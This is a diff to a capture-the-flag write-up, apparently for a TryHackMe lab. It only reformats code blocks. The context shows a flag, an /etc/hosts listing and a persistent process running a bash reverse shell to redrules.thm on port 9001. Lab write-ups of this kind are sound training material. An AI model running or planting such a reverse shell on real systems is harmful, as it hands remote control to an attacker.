@@ -162,7 +162,8 @@ THM{Is_thAt_all_y0u_can_d0_blU3?}
 After a bit of analysis using `linpeas` and `pspy` (or alternatively you can just use `ps -aux`) we notice 2 things:
 
 1. The `/etc/hosts` file has an entry and we can only _amend_ to it:
-```
+
+```txt
 127.0.0.1 localhost
 127.0.1.1 red
 192.168.0.1 redrules.thm
@@ -176,7 +177,8 @@ ff02::2 ip6-allrouter
 ```
 
 2. There's a persistently run process:
-```
+
+```txt
 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
 ```
 
